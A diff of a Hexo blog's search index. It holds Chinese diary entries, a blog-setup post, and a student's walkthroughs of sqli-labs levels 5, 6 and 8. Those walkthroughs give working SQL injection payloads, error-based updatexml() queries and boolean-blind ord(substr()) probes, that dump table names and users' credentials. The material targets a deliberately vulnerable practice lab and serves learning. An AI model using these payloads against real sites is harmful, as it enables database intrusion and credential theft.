@@ -1,6 +1,30 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>惜</title>
+    <url>/2022/11/06/Diary_1106/</url>
+    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_3.png" alt="凉宫春日"></p>
+<span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末转瞬即逝，新的一天再次来临</p>
+<h1 id="简单记录"><a href="#简单记录" class="headerlink" title="简单记录"></a>简单记录</h1><ol>
+<li>早上起来感觉感冒了，竟然中招了，真糟。及时止损，估计是被窝不够暖和。</li>
+<li>上午9点体测，跳远和引体向上。排队等了一个小时。</li>
+<li>python爬虫基本算是学完了，下午自己做了一个爬虫把某人博客的内容给爬取出来了，基本没有反爬措施，比较简单。只是我不大熟练，弄了好几小时。</li>
+<li>晚上安装sqli-labs靶场，不知哪儿出了问题，本该十分钟内解决的问题折腾了三小时，最终重装phpstudy_pro就没问题了。所谓重装解决一切困难呢。 </li>
+<li>本想直接做靶场的练习，但不曾想连答案解析都看不懂，还是得听听网课看看文章之类的吧。</li>
+</ol>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><strong>有花堪折直须折，莫待无花空折枝</strong></p>
+]]></content>
+      <categories>
+        <category>日志</category>
+      </categories>
+      <tags>
+        <tag>日志</tag>
+        <tag>生活</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>锦瑟</title>
     <url>/2022/11/05/Diary_1105/</url>
     <content><![CDATA[<p><img src="/images/Holo.png" alt="Holo"></p>
@@ -32,20 +56,14 @@
       </tags>
   </entry>
   <entry>
-    <title>惜</title>
-    <url>/2022/11/06/Diary_1106/</url>
-    <content><![CDATA[<p><img src="/images/%E5%87%89%E5%AE%AB%E6%98%A5%E6%97%A5_3.png" alt="凉宫春日"></p>
+    <title>夫天地者，万物之逆旅也</title>
+    <url>/2022/11/08/Diary_1108/</url>
+    <content><![CDATA[<p><img src="/images/violet--6.png" alt="violet"></p>
 <span id="more"></span>
 
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末转瞬即逝，新的一天再次来临</p>
-<h1 id="简单记录"><a href="#简单记录" class="headerlink" title="简单记录"></a>简单记录</h1><ol>
-<li>早上起来感觉感冒了，竟然中招了，真糟。及时止损，估计是被窝不够暖和。</li>
-<li>上午9点体测，跳远和引体向上。排队等了一个小时。</li>
-<li>python爬虫基本算是学完了，下午自己做了一个爬虫把某人博客的内容给爬取出来了，基本没有反爬措施，比较简单。只是我不大熟练，弄了好几小时。</li>
-<li>晚上安装sqli-labs靶场，不知哪儿出了问题，本该十分钟内解决的问题折腾了三小时，最终重装phpstudy_pro就没问题了。所谓重装解决一切困难呢。 </li>
-<li>本想直接做靶场的练习，但不曾想连答案解析都看不懂，还是得听听网课看看文章之类的吧。</li>
-</ol>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><strong>有花堪折直须折，莫待无花空折枝</strong></p>
+<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>夫天地者万物之逆旅也；光阴者百代之过客也。而浮生若梦，为欢几何？</p>
+<h1 id="有一天"><a href="#有一天" class="headerlink" title="有一天"></a>有一天</h1><p>痛改流水账模式，记录全经过以后也不会在意，不如写点想写的。<br>学习进度太慢了！内心有点烦躁，希望能在本周完成SQL注入的学习。<br>接自来水来烧开水，水质真不行。我都有点想买水桶了，但问题是成本会增加。不知嘴上皮肤一直皲裂是否因水的缘故。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>灵活一点，有趣一点。足矣。</p>
 ]]></content>
       <categories>
         <category>日志</category>
@@ -68,24 +86,6 @@
 <p>下午一直在上课，午觉也只睡了半小时。第一节是《网络安全服务与管理》，去了之后发现这门课都没什么用。干脆下次不去了吧。</p>
 <p>晚上重温了下sql语句，毕竟以前学的都忘光了。书还没看完就睡了，实在困。睡了大概两三个小时，起来学了点sql注入，一天便这样结束了。</p>
 <h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>这次好像还是写了20分钟，还是太久，争取缩短到10分钟以内。以后只说关注的事。</p>
-]]></content>
-      <categories>
-        <category>日志</category>
-      </categories>
-      <tags>
-        <tag>日志</tag>
-        <tag>生活</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>夫天地者，万物之逆旅也</title>
-    <url>/2022/11/08/Diary_1108/</url>
-    <content><![CDATA[<p><img src="/images/violet--6.png" alt="violet"></p>
-<span id="more"></span>
-
-<h1 id="诗"><a href="#诗" class="headerlink" title="诗"></a>诗</h1><p>夫天地者万物之逆旅也；光阴者百代之过客也。而浮生若梦，为欢几何？</p>
-<h1 id="有一天"><a href="#有一天" class="headerlink" title="有一天"></a>有一天</h1><p>痛改流水账模式，记录全经过以后也不会在意，不如写点想写的。<br>学习进度太慢了！内心有点烦躁，希望能在本周完成SQL注入的学习。<br>接自来水来烧开水，水质真不行。我都有点想买水桶了，但问题是成本会增加。不知嘴上皮肤一直皲裂是否因水的缘故。</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>灵活一点，有趣一点。足矣。</p>
 ]]></content>
       <categories>
         <category>日志</category>
@@ -141,69 +141,6 @@
         <tag>字符型</tag>
         <tag>数字型</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>First Blog</title>
-    <url>/2022/11/03/first_blog/</url>
-    <content><![CDATA[<p><img src="/images/Christina.png" alt="Kurisu Makise"></p>
-<span id="more"></span>
-
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次搭建博客是我第一次搭建，总共花费了我两天两夜，过程很煎熬，遇到了不少挫折，不过还是很值得，我对此毫不后悔。</p>
-<h1 id="想法萌芽"><a href="#想法萌芽" class="headerlink" title="想法萌芽"></a>想法萌芽</h1><p>搭建这个博客是因为想到要开始学web安全的技术，有很多知识点需要记录查阅。于是在网上查，看到了一篇名叫<a href="https://zhuanlan.zhihu.com/p/102592286">从零开始搭建个人博客</a>的文章，正是因为看到了这篇文章我才知道搭建博客并没有我想象中那么难。从而开始了博客之旅。</p>
-<h1 id="所需能力"><a href="#所需能力" class="headerlink" title="所需能力"></a>所需能力</h1><p>搭完博客后，我认为如果只是想搭一个普通的博客，其中的技术含量并没有多少。困难之处通常是因为网上的文章过时或是与自己的配置不和而导致的出错等。唯一需要的是耐心与查阅资料的能力。<br><del>在搭建博客期间最擅长的代码</del>：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br><span class="line">$ hexo s</span><br></pre></td></tr></table></figure>
-
-<h1 id="关于域名"><a href="#关于域名" class="headerlink" title="关于域名"></a>关于域名</h1><p>本来想买域名的，但我重新审视了自己的内心之后，发现其实买域名只是为了满足自己的虚荣心。在现阶段根本不需要域名。于是最终放弃了购买域名。我想，等我发表了10篇<strong>有点内容</strong>的博客后我再购买域名吧。</p>
-<h1 id="挫折点"><a href="#挫折点" class="headerlink" title="挫折点"></a>挫折点</h1><ol>
-<li><strong>git与GitHub连接</strong>。由于我自己的大意以及参考文章的不严谨导致第一天晚上多熬了一个多小时的夜。</li>
-<li><strong>安装node.js和Hexo</strong>。先是更改nodejs的配置环境，从C盘到D盘。这步倒还好，顺利进行了。但随之而来的Hexo的安装就惨了。因为前面nodejs的配置不是通常情况，参考文章也偶尔出错，导致我不断报错。而每次报错我又到网上查原因，再根据其它文章打补丁。一来二去，问题没解决，头却大了。就这个问题，让我在电脑前像僵尸一样坐了三个多小时，最后气得我把nodejs和hexo及其相关文件全卸载，所有网页全关了。之后重新下载，在网上随便找了篇文章。竟然奇迹般十分钟就解决了（应该说本来就只该花这点时间吗&#x2F;(ㄒoㄒ)&#x2F;~~）</li>
-<li><strong>美化网页</strong>。完全是大意了，本以为网站都搭好了，应该不会出现什么问题了，于是在网上东找一点西找一点，未曾想落入了大意的圈套。这个圈套就是“分享”。不知道看了谁的文章，稀里糊涂下载了分享模块，结果出现了无论如何也无法消灭的高危漏洞。这便是噩梦的开始，恶魔的降临，恶意的迸发。心力憔悴地折腾了四个小时后，我最终不甘心地向现实低头–卸载所有内容，网站从零开始。</li>
-</ol>
-<h1 id="经验教训"><a href="#经验教训" class="headerlink" title="经验教训"></a>经验教训</h1><ul>
-<li>最好找<strong>2年</strong>以内的文章。太久远的由于时效性往往会导致不兼容或是其它错误。</li>
-<li>最好看那些<em>评论数多或是点赞多</em>的文章。以便能够顺利搭建，即便不能也可以看看和自己有类似情况或是已经解决问题的人。</li>
-<li><em>多对比慎操作</em>。不要看到一篇文章怎么写就马上实操，尽量多搜几篇文章看看他们的处理方案，从中选优。毕竟试错成本可能会很高。</li>
-<li>自己操作的时候要<em>看清楚</em>。多花两分钟看，总比多花两小时排错好。</li>
-<li>保持<em>耐心</em>。实在厌烦排错的时候不妨重装。</li>
-<li>网站不要放到<em>社交平台</em>上。容易被盯上网站被黑。（等我啥时候安全技术强了就不怕了,,ԾㅂԾ,,）</li>
-</ul>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ol>
-<li>这篇文章是我搭建博客的开始，虽然有些问题，不过不影响我对它的感谢。<br><a href="https://zhuanlan.zhihu.com/p/102592286">从零开始搭建个人博客</a></li>
-<li>虽然是在2017年写就的文章，过了5年到如今仍然适用。也是这篇文章把我从第2个挫折点的痛苦旋涡中解救出来。<br><a href="https://www.jianshu.com/p/3f2fe426edff">在Windows环境下使用hexo搭建博客</a></li>
-<li>在我优化博客的时候有许多优质文章提供了帮助。</li>
-</ol>
-<p><a href="https://kumarinko.gitee.io/2022/01/01/Build_hexo-next_Blog/">hexo-next博客搭建</a></p>
-<p><a href="https://blog.csdn.net/as480133937/article/details/100138838">Hexo-Next 主题博客个性化配置超详细，超全面</a></p>
-<p><a href="https://cloud.tencent.com/developer/article/1952241">hexo插件篇</a></p>
-<p><a href="https://blog.csdn.net/qnhnt/article/details/126330886">Hexo-NexT v8.x字数统计以及阅读时间配置</a></p>
-]]></content>
-      <categories>
-        <category>随想</category>
-      </categories>
-      <tags>
-        <tag>随想</tag>
-        <tag>搭建博客</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2022/11/03/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<span id="more"></span>
-
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
   </entry>
   <entry>
     <title>SQL注入之sqli-labs_1+2</title>
@@ -280,6 +217,69 @@
       </tags>
   </entry>
   <entry>
+    <title>First Blog</title>
+    <url>/2022/11/03/first_blog/</url>
+    <content><![CDATA[<p><img src="/images/Christina.png" alt="Kurisu Makise"></p>
+<span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次搭建博客是我第一次搭建，总共花费了我两天两夜，过程很煎熬，遇到了不少挫折，不过还是很值得，我对此毫不后悔。</p>
+<h1 id="想法萌芽"><a href="#想法萌芽" class="headerlink" title="想法萌芽"></a>想法萌芽</h1><p>搭建这个博客是因为想到要开始学web安全的技术，有很多知识点需要记录查阅。于是在网上查，看到了一篇名叫<a href="https://zhuanlan.zhihu.com/p/102592286">从零开始搭建个人博客</a>的文章，正是因为看到了这篇文章我才知道搭建博客并没有我想象中那么难。从而开始了博客之旅。</p>
+<h1 id="所需能力"><a href="#所需能力" class="headerlink" title="所需能力"></a>所需能力</h1><p>搭完博客后，我认为如果只是想搭一个普通的博客，其中的技术含量并没有多少。困难之处通常是因为网上的文章过时或是与自己的配置不和而导致的出错等。唯一需要的是耐心与查阅资料的能力。<br><del>在搭建博客期间最擅长的代码</del>：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br><span class="line">$ hexo s</span><br></pre></td></tr></table></figure>
+
+<h1 id="关于域名"><a href="#关于域名" class="headerlink" title="关于域名"></a>关于域名</h1><p>本来想买域名的，但我重新审视了自己的内心之后，发现其实买域名只是为了满足自己的虚荣心。在现阶段根本不需要域名。于是最终放弃了购买域名。我想，等我发表了10篇<strong>有点内容</strong>的博客后我再购买域名吧。</p>
+<h1 id="挫折点"><a href="#挫折点" class="headerlink" title="挫折点"></a>挫折点</h1><ol>
+<li><strong>git与GitHub连接</strong>。由于我自己的大意以及参考文章的不严谨导致第一天晚上多熬了一个多小时的夜。</li>
+<li><strong>安装node.js和Hexo</strong>。先是更改nodejs的配置环境，从C盘到D盘。这步倒还好，顺利进行了。但随之而来的Hexo的安装就惨了。因为前面nodejs的配置不是通常情况，参考文章也偶尔出错，导致我不断报错。而每次报错我又到网上查原因，再根据其它文章打补丁。一来二去，问题没解决，头却大了。就这个问题，让我在电脑前像僵尸一样坐了三个多小时，最后气得我把nodejs和hexo及其相关文件全卸载，所有网页全关了。之后重新下载，在网上随便找了篇文章。竟然奇迹般十分钟就解决了（应该说本来就只该花这点时间吗&#x2F;(ㄒoㄒ)&#x2F;~~）</li>
+<li><strong>美化网页</strong>。完全是大意了，本以为网站都搭好了，应该不会出现什么问题了，于是在网上东找一点西找一点，未曾想落入了大意的圈套。这个圈套就是“分享”。不知道看了谁的文章，稀里糊涂下载了分享模块，结果出现了无论如何也无法消灭的高危漏洞。这便是噩梦的开始，恶魔的降临，恶意的迸发。心力憔悴地折腾了四个小时后，我最终不甘心地向现实低头–卸载所有内容，网站从零开始。</li>
+</ol>
+<h1 id="经验教训"><a href="#经验教训" class="headerlink" title="经验教训"></a>经验教训</h1><ul>
+<li>最好找<strong>2年</strong>以内的文章。太久远的由于时效性往往会导致不兼容或是其它错误。</li>
+<li>最好看那些<em>评论数多或是点赞多</em>的文章。以便能够顺利搭建，即便不能也可以看看和自己有类似情况或是已经解决问题的人。</li>
+<li><em>多对比慎操作</em>。不要看到一篇文章怎么写就马上实操，尽量多搜几篇文章看看他们的处理方案，从中选优。毕竟试错成本可能会很高。</li>
+<li>自己操作的时候要<em>看清楚</em>。多花两分钟看，总比多花两小时排错好。</li>
+<li>保持<em>耐心</em>。实在厌烦排错的时候不妨重装。</li>
+<li>网站不要放到<em>社交平台</em>上。容易被盯上网站被黑。（等我啥时候安全技术强了就不怕了,,ԾㅂԾ,,）</li>
+</ul>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ol>
+<li>这篇文章是我搭建博客的开始，虽然有些问题，不过不影响我对它的感谢。<br><a href="https://zhuanlan.zhihu.com/p/102592286">从零开始搭建个人博客</a></li>
+<li>虽然是在2017年写就的文章，过了5年到如今仍然适用。也是这篇文章把我从第2个挫折点的痛苦旋涡中解救出来。<br><a href="https://www.jianshu.com/p/3f2fe426edff">在Windows环境下使用hexo搭建博客</a></li>
+<li>在我优化博客的时候有许多优质文章提供了帮助。</li>
+</ol>
+<p><a href="https://kumarinko.gitee.io/2022/01/01/Build_hexo-next_Blog/">hexo-next博客搭建</a></p>
+<p><a href="https://blog.csdn.net/as480133937/article/details/100138838">Hexo-Next 主题博客个性化配置超详细，超全面</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1952241">hexo插件篇</a></p>
+<p><a href="https://blog.csdn.net/qnhnt/article/details/126330886">Hexo-NexT v8.x字数统计以及阅读时间配置</a></p>
+]]></content>
+      <categories>
+        <category>随想</category>
+      </categories>
+      <tags>
+        <tag>随想</tag>
+        <tag>搭建博客</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2022/11/03/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<span id="more"></span>
+
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>sqli-labs_3</title>
     <url>/2022/11/08/sqli-labs_3/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有了过第1，2关的基础，现在再往后看就比较轻松了。</p>
@@ -352,6 +352,52 @@
       </tags>
   </entry>
   <entry>
+    <title>sqli-labs_5+6</title>
+    <url>/2022/11/08/sqli-labs_5+6/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第5，6关基本一致，区别只在于单引号和双引号，因此放在一起了。这两关的关键点在于：正确时不返回结果，错误时有报错信息。因此综合判断之下，使用报错注入的方式最好。</p>
+<span id="more"></span>
+
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>判断是否存在<strong>SQL注入</strong><br>和前几关一致，这里不过多阐述。<br>输入?id&#x3D;1”有报错信息。<br>报错信息为：<br><img src="/simg/sqli-labs_6.png" alt="sqli-labs_6输入?id=1&quot;时的报错信息"></p>
+</li>
+<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由报错信息near ‘“1”” LIMIT 0,1’ at line 1可知是双引号字符型。<br>构造语句?id&#x3D;1”–+</p>
+</li>
+<li><p>猜解SQL查询语句中的<strong>字段数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;order by 4--+</span><br></pre></td></tr></table></figure>
+<p>可得字段数为3</p>
+</li>
+<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>由于无法返回正常信息，所以不能使用union联合查询<br>使用报错注入常用的函数即可（<a href="https://truthnian.github.io/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">常用函数</a>）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(database(),0x7e,version())),0x23),1)--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
+<p>因为updatexml()函数最多只能显示32个字符，无法显示到所需的数据，所以不能只写where table_name&#x3D;’users’  应该再加一个限定到当前数据库。</p>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x23),1)--+</span><br></pre></td></tr></table></figure>
+<p>因为updatexml()函数最多只能显示32个字符，所需数据可能无法显示完全，因此需要使用limit限制每行显示一组数据。<br><strong>limit</strong>简单解释：<br>limit 3,1  表示返回从第3行起的1行数据，逗号之前的值对应OFFSET，逗号之后的值对应LIMIT。<br>注意：limit第一个被检索的行是第0行，当检索完后不会显示数据</p>
+</li>
+</ol>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
+<li><p><a href="https://blog.csdn.net/wyzhxhn/article/details/127718995">sqli-labs—–第五关</a></p>
+</li>
+<li><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs_7</title>
     <url>/2022/11/08/sqli-labs_7/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关耗费了我好几个小时，究其原因，是大多博客写得不清不楚，或者说自认为清楚，读者(我)却感到很迷惑。</p>
@@ -407,41 +453,39 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs_5+6</title>
-    <url>/2022/11/08/sqli-labs_5+6/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第5，6关基本一致，区别只在于单引号和双引号，因此放在一起了。这两关的关键点在于：正确时不返回结果，错误时有报错信息。因此综合判断之下，使用报错注入的方式最好。</p>
+    <title>sqli-labs_8</title>
+    <url>/2022/11/09/sqli-labs_8/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次第八关页面只能显示对错，而没有任何其它信息，因此我们可以使用布尔盲注和时间盲注。这里主要来讲讲用<a href="https://truthnian.github.io/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a>如何完成的。</p>
 <span id="more"></span>
 
 <h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>判断是否存在<strong>SQL注入</strong><br>和前几关一致，这里不过多阐述。<br>输入?id&#x3D;1”有报错信息。<br>报错信息为：<br><img src="/simg/sqli-labs_6.png" alt="sqli-labs_6输入?id=1&quot;时的报错信息"></p>
+<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 无任何显示，说明是错误的<br>输入?id&#x3D;1’’  显示：You are in………..<br>输入?id&#x3D;1’--+  显示：You are in………..<br>说明构造成功，且是单引号字符型</p>
 </li>
-<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由报错信息near ‘“1”” LIMIT 0,1’ at line 1可知是双引号字符型。<br>构造语句?id&#x3D;1”–+</p>
-</li>
-<li><p>猜解SQL查询语句中的<strong>字段数</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;order by 4--+</span><br></pre></td></tr></table></figure>
-<p>可得字段数为3</p>
-</li>
-<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>由于无法返回正常信息，所以不能使用union联合查询<br>使用报错注入常用的函数即可（<a href="https://truthnian.github.io/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">常用函数</a>）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(database(),0x7e,version())),0x23),1)--+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
-<p>因为updatexml()函数最多只能显示32个字符，无法显示到所需的数据，所以不能只写where table_name&#x3D;’users’  应该再加一个限定到当前数据库。</p>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x23),1)--+</span><br></pre></td></tr></table></figure>
-<p>因为updatexml()函数最多只能显示32个字符，所需数据可能无法显示完全，因此需要使用limit限制每行显示一组数据。<br><strong>limit</strong>简单解释：<br>limit 3,1  表示返回从第3行起的1行数据，逗号之前的值对应OFFSET，逗号之后的值对应LIMIT。<br>注意：limit第一个被检索的行是第0行，当检索完后不会显示数据</p>
+<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
 </li>
 </ol>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
-<li><p><a href="https://blog.csdn.net/wyzhxhn/article/details/127718995">sqli-labs—–第五关</a></p>
-</li>
-<li><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
-</li>
+<ul>
+<li>由于无法显示报错信息，我们需要使用length()函数首先判断数据库名长度<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and length(database())&gt;7--+  返回正确</span><br><span class="line">?id=1&#x27;and length(database())&gt;8--+  返回错误</span><br></pre></td></tr></table></figure>
+说明数据库名长度为8</li>
+<li>接下来便是一个个判断字符，这里可以使用substr(),mid(),substring(),ord(),ascii()等，选择比较多，任意选取即可<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;114--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;115--+   返回错误</span><br></pre></td></tr></table></figure>
+说明数据库名第1个字符是s，以此类推，可得数据库名为security<br>数据库版本号也是同理</li>
 </ul>
+<ol start="3">
+<li><p><strong>爆表</strong><br>道理是类似的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;102--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;101--+   返回错误</span><br></pre></td></tr></table></figure>
+<p>说明第一个表名的第1个字符是e，以此类推，可以得到所有表名，最终我们发现关键的表名users<br>这里使用limit的原因是因为一个数据库名中表名很可能不止一个，我们需要依次查询</p>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;106--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;105--+   返回错误</span><br></pre></td></tr></table></figure>
+<p>说明第一个字段名是i，以此类推，可以得到所有字段名，最终我们发现关键的字段名username,password</p>
